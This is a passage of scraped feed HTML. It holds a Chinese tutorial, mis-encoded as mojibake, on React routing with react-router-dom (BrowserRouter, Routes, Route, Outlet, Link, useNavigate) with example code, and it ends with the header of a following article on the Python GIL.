  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:19:44.000Z" title="Mon Dec 29 2025 04:19:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Web å¼€å‘çš„å‘å±•å†ç¨‹ä¸­ï¼Œé¡µé¢çš„è·³è½¬å’Œå±•ç¤ºæ–¹å¼ç»å†äº†æ˜¾è‘—çš„å˜åŒ–ï¼Œå…¶ä¸­è·¯ç”±æœºåˆ¶çš„æ¼”å˜å°¤ä¸ºå…³é”®ã€‚æœ¬æ–‡å°†ä»å¤šé¡µåº”ç”¨ä¸å•é¡µåº”ç”¨çš„åŒºåˆ«å…¥æ‰‹ï¼Œè¯¦ç»†ä»‹ç» React ç”Ÿæ€ä¸­ä¸»æµçš„è·¯ç”±è§£å†³æ–¹æ¡ˆ â€”â€”<code>react-router-dom</code> çš„ä½¿ç”¨æ–¹æ³•ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä»å¤šé¡µåº”ç”¨åˆ°å•é¡µåº”ç”¨</h2>
<h3 data-id="heading-1">1. ä¼ ç»Ÿå¤šé¡µåº”ç”¨</h3>
<p>æ—©æœŸçš„ Web åº”ç”¨å¤§å¤šæ˜¯<code>å¤šé¡µåº”ç”¨</code>ã€‚æ¯ä¸€ä¸ªé¡µé¢éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ HTML æ–‡ä»¶ï¼Œå½“ç”¨æˆ·åœ¨ä¸åŒé¡µé¢é—´è·³è½¬æ—¶ï¼Œæµè§ˆå™¨ä¼šé‡æ–°è¯·æ±‚æ–°çš„ HTML æ–‡ä»¶ï¼Œé¡µé¢ä¼šæ•´ä½“åˆ·æ–°ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼ŒURL çš„å˜åŒ–ç›´æ¥å¯¹åº”ç€ä¸åŒçš„ HTML èµ„æºã€‚</p>
<h3 data-id="heading-2">2. ç°ä»£å•é¡µåº”ç”¨</h3>
<p>éšç€å‰ç«¯æŠ€æœ¯çš„å‘å±•ï¼Œ<code>å•é¡µåº”ç”¨</code>é€æ¸æˆä¸ºä¸»æµã€‚å•é¡µåº”ç”¨åªæœ‰ä¸€ä¸ª HTML æ–‡ä»¶ï¼Œæ‰€æœ‰çš„é¡µé¢å†…å®¹éƒ½é€šè¿‡ JavaScript åŠ¨æ€ç”Ÿæˆå’Œåˆ‡æ¢ã€‚å½“ URL å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¹¶ä¸ä¼šé‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢ï¼Œè€Œæ˜¯é€šè¿‡è·¯ç”±æœºåˆ¶ï¼Œå°†å¯¹åº”çš„ç»„ä»¶æ¸²æŸ“åˆ°å›ºå®šçš„ HTML å®¹å™¨ä¸­ï¼š</p>
<ul>
<li>
<p>è®¿é—® <code>http://localhost:5173/home</code> æ—¶ï¼Œå°†é¦–é¡µç»„ä»¶åŠ è½½åˆ° HTML ä¸­</p>
</li>
<li>
<p>è®¿é—® <code>http://localhost:5173/about</code> æ—¶ï¼Œå°†å…³äºé¡µç»„ä»¶åŠ è½½åˆ°åŒä¸€ä¸ª HTML ä¸­</p>
</li>
</ul>
<p>è¿™ç§æ–¹å¼ä½¿å¾—é¡µé¢åˆ‡æ¢æ›´åŠ æµç•…ï¼Œç”¨æˆ·ä½“éªŒæ›´æ¥è¿‘åŸç”Ÿåº”ç”¨ã€‚</p>
<h2 data-id="heading-3">äºŒã€é¡µé¢ä¸ç»„ä»¶çš„åŒºåˆ«</h2>
<p>åœ¨å•é¡µåº”ç”¨çš„è·¯ç”±ä½“ç³»ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸å°† "é…è·¯ç”±çš„ç»„ä»¶" ç§°ä¸º "é¡µé¢"ï¼Œè€Œæ™®é€šçš„ç»„ä»¶åˆ™ç”¨äºæ„å»ºé¡µé¢çš„å„ä¸ªéƒ¨åˆ†ã€‚ç®€å•æ¥è¯´ï¼Œé¡µé¢æ˜¯å¯ä»¥é€šè¿‡ URL ç›´æ¥è®¿é—®çš„ç»„ä»¶ï¼Œæ˜¯è·¯ç”±é…ç½®çš„åŸºæœ¬å•ä½ã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€React Router çš„ä½¿ç”¨</h2>
<p>åœ¨ React é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>react-router-dom</code> æ¥å®ç°è·¯ç”±åŠŸèƒ½ã€‚é¦–å…ˆéœ€è¦å®‰è£…è¿™ä¸ªåº“ï¼š</p>
<pre><code class="hljs language-Bash" lang="Bash">npm i react-router-dom
</code></pre>
<p>ä¸‹é¢æˆ‘ä»¬æŒ‰ç…§æ ¸å¿ƒç»„ä»¶å’Œ API çš„ä½¿ç”¨é¡ºåºï¼Œä»‹ç» react-router-dom çš„åŸºæœ¬ç”¨æ³•ï¼š</p>
<h3 data-id="heading-5">1. BrowserRouterï¼šè·¯ç”±æ¨¡å¼</h3>
<p><code>BrowserRouter</code> æ˜¯ react-router-dom æä¾›çš„ä¸€ç§è·¯ç”±æ¨¡å¼ï¼ˆ<code>history æ¨¡å¼</code>ï¼‰ï¼Œå®ƒä½¿ç”¨ HTML5 çš„ history API æ¥ç®¡ç†è·¯ç”±çŠ¶æ€ã€‚æˆ‘ä»¬éœ€è¦å°†æ•´ä¸ªåº”ç”¨çš„è·¯ç”±é…ç½®åŒ…è£¹åœ¨ <code>BrowserRouter</code> ä¸­ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span>
      {/* è·¯ç”±é…ç½®å’Œåº”ç”¨å†…å®¹ */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-6">2. Routesï¼šè·¯ç”±å®¹å™¨</h3>
<p><code>Routes</code> æä¾›äº†ä¸€ä¸ª<code>è·¯ç”±å‡ºå£</code>ï¼Œå®ƒä¼šæ ¹æ®å½“å‰ URLï¼Œä»å…¶å­è·¯ç”±é…ç½®ä¸­é€‰æ‹©åŒ¹é…çš„è·¯ç”±è¿›è¡Œæ¸²æŸ“ã€‚å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè·¯ç”±çš„å®¹å™¨ï¼Œé‡Œé¢åŒ…å«å¤šä¸ª <code>Route</code> é…ç½®é¡¹ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span>, <span class="hljs-title class_">Routes</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
        {/* å¤šä¸ªRouteé…ç½®é¡¹ */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-7">3. Routeï¼šè·¯ç”±é…ç½®é¡¹</h3>
<p><code>Route</code> ç”¨äºå®šä¹‰ URL è·¯å¾„ä¸ç»„ä»¶çš„å¯¹åº”å…³ç³»ï¼Œé€šè¿‡ <code>path</code> å±æ€§æŒ‡å®š URL è·¯å¾„ï¼Œé€šè¿‡ <code>element</code> å±æ€§æŒ‡å®šå¯¹åº”çš„ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span>, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./views/home/Home'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./views/login/Login'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">'/login'</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Login</span> /&gt;</span>} /&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">'/home'</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span>
  )
}
</code></pre>
<p>è¿˜å¯ä»¥é€šè¿‡ <code>Navigate</code> ç»„ä»¶å®ç°è·¯ç”±é‡å®šå‘ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">'/'</span> element={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/login"</span> /&gt;</span></span>} /&gt;
</code></pre>
<p>å¯¹äºä¸å­˜åœ¨çš„è·¯å¾„ï¼Œå¯ä»¥é…ç½® <code>404 é¡µé¢</code>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">'*'</span> element={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>NOT FOUND<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span>} /&gt;
</code></pre>
<h3 data-id="heading-8">4. Outletï¼šäºŒçº§è·¯ç”±å‡ºå£</h3>
<p>å½“æˆ‘ä»¬éœ€è¦å®ç°åµŒå¥—è·¯ç”±ï¼ˆäºŒçº§è·¯ç”±ï¼‰æ—¶ï¼Œ<code>Outlet</code> ç»„ä»¶ç”¨äºæŒ‡å®šå­è·¯ç”±ç»„ä»¶çš„æ¸²æŸ“ä½ç½®ã€‚çˆ¶ç»„ä»¶ä¸­æ”¾ç½® <code>Outlet</code>ï¼Œå­è·¯ç”±çš„å†…å®¹å°±ä¼šåœ¨è¿™é‡Œæ˜¾ç¤ºï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// çˆ¶ç»„ä»¶ Home.jsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Outlet</span>, <span class="hljs-title class_">Link</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"home"</span>&gt;</span>
      {/* å…¶ä»–å†…å®¹ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">className</span>=<span class="hljs-string">'content'</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span> {/* å­è·¯ç”±ç»„ä»¶ä¼šåœ¨è¿™é‡Œæ¸²æŸ“ */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<p>åœ¨è·¯ç”±é…ç½®ä¸­ï¼Œå¯ä»¥è¿™æ ·å®šä¹‰åµŒå¥—è·¯ç”±ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">'/home'</span> element={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Home</span> /&gt;</span></span>}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">'class'</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Class</span> /&gt;</span>} /&gt;</span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">'leetcode'</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">LeetCode</span> /&gt;</span>} /&gt;</span>
&lt;/<span class="hljs-title class_">Route</span>&gt;
</code></pre>
<h3 data-id="heading-9">5. Linkï¼šå¯¼èˆªé“¾æ¥</h3>
<p><code>Link</code> ç»„ä»¶ç”¨äºåˆ›å»ºè·¯ç”±å¯¼èˆªé“¾æ¥ï¼Œç±»ä¼¼äº HTML ä¸­çš„ <code>&lt;a&gt;</code> æ ‡ç­¾ï¼Œä½†ä¸ä¼šå¼•èµ·é¡µé¢åˆ·æ–°ï¼Œåªä¼šæ›´æ–° URL å’Œå¯¹åº”çš„ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Link</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Sidebar</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/home/class"</span>&gt;</span>è¯¾ç¨‹<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/home/leetcode"</span>&gt;</span>ç®—æ³•<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-10">6. useNavigateï¼šç¼–ç¨‹å¼å¯¼èˆª</h3>
<p><code>useNavigate</code> æ˜¯ä¸€ä¸ª React Hookï¼Œç”¨äºåœ¨ä»£ç ä¸­å®ç°è·¯ç”±è·³è½¬ï¼ˆç¼–ç¨‹å¼å¯¼èˆªï¼‰ï¼Œæ¯”å¦‚åœ¨ç™»å½•æˆåŠŸåè·³è½¬åˆ°é¦–é¡µï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { useNavigate } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>()

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// ç™»å½•é€»è¾‘å¤„ç†...</span>
    <span class="hljs-title function_">navigate</span>(<span class="hljs-string">'/home?id=123'</span>) <span class="hljs-comment">// ç™»å½•æˆåŠŸåè·³è½¬åˆ°é¦–é¡µ,æºå¸¦å‚æ•°</span>
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLogin}</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h2 data-id="heading-11">å››ã€æ€»ç»“</h2>
<p>react-router-dom æä¾›äº†ä¸€å¥—å®Œæ•´çš„è·¯ç”±è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡ <code>BrowserRouter</code>ã€<code>Routes</code>ã€<code>Route</code>ã€<code>Outlet</code>ã€<code>Link</code> å’Œ <code>useNavigate</code> ç­‰æ ¸å¿ƒ APIï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾å®ç°å•é¡µåº”ç”¨çš„è·¯ç”±åŠŸèƒ½ã€‚æŒæ¡è¿™äº›åŸºç¡€ç”¨æ³•ï¼Œèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æ„å»ºå‡ºæµç•…çš„é¡µé¢è·³è½¬ä½“éªŒï¼Œä¸ºç”¨æˆ·æä¾›æ›´å¥½çš„äº¤äº’æ„Ÿå—ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ Python GIL]]></title>    <link>https://juejin.cn/post/7588996730771767296</link>    <guid>https://juejin.cn/post/7588996730771767296</guid>    <pubDate>2025-12-29T05:28:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588996730771767296" data-draft-id="7588865809474027560" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ Python GIL"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-29T05:28:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿å‡¡"/> <meta itemprop="url" content="https://juejin.cn/user/290747765274222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ Python GIL
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/290747765274222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿å‡¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:28:16.000Z" title="Mon Dec 29 2025 05:28:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
